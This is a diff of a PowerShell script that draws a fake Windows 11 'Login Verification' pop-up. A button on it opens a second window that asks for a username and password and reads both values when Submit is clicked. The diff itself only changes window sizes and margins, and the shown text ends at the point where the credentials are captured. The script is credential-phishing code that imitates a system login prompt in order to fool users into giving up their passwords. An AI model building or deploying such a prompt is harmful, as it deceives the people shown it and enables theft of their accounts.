@@ -1,11 +1,10 @@
-
 Add-Type -AssemblyName PresentationFramework
 
 # Create the fake Windows 11 pop up
 $popup = New-Object -TypeName System.Windows.Window
 $popup.Title = "Login Verification"
 $popup.Width = 400
-$popup.Height = 300
+$popup.Height = 100
 $popup.WindowStartupLocation = "CenterScreen"
 
 $label = New-Object -TypeName System.Windows.Controls.Label
@@ -19,27 +18,27 @@ $button.Add_Click({
     # Create the pop up window for entering username and password
     $credentials = New-Object -TypeName System.Windows.Window
     $credentials.Title = "Enter Credentials"
-    $credentials.Width = 200
+    $credentials.Width = 400
     $credentials.Height = 200
     $credentials.WindowStartupLocation = "CenterScreen"
 
     $usernameLabel = New-Object -TypeName System.Windows.Controls.Label
     $usernameLabel.Content = "Username:"
-    $usernameLabel.Margin = "20"
+    $usernameLabel.Margin = "1"
 
     $usernameTextBox = New-Object -TypeName System.Windows.Controls.TextBox
-    $usernameTextBox.Margin = "20"
+    $usernameTextBox.Margin = "5"
 
     $passwordLabel = New-Object -TypeName System.Windows.Controls.Label
     $passwordLabel.Content = "Password:"
-    $passwordLabel.Margin = "20"
+    $passwordLabel.Margin = "5"
 
     $passwordBox = New-Object -TypeName System.Windows.Controls.PasswordBox
-    $passwordBox.Margin = "20"
+    $passwordBox.Margin = "5"
 
     $submitButton = New-Object -TypeName System.Windows.Controls.Button
     $submitButton.Content = "Submit"
-    $submitButton.Margin = "20"
+    $submitButton.Margin = "10"
     $submitButton.Add_Click({
         $username = $usernameTextBox.Text
         $password = $passwordBox.Password
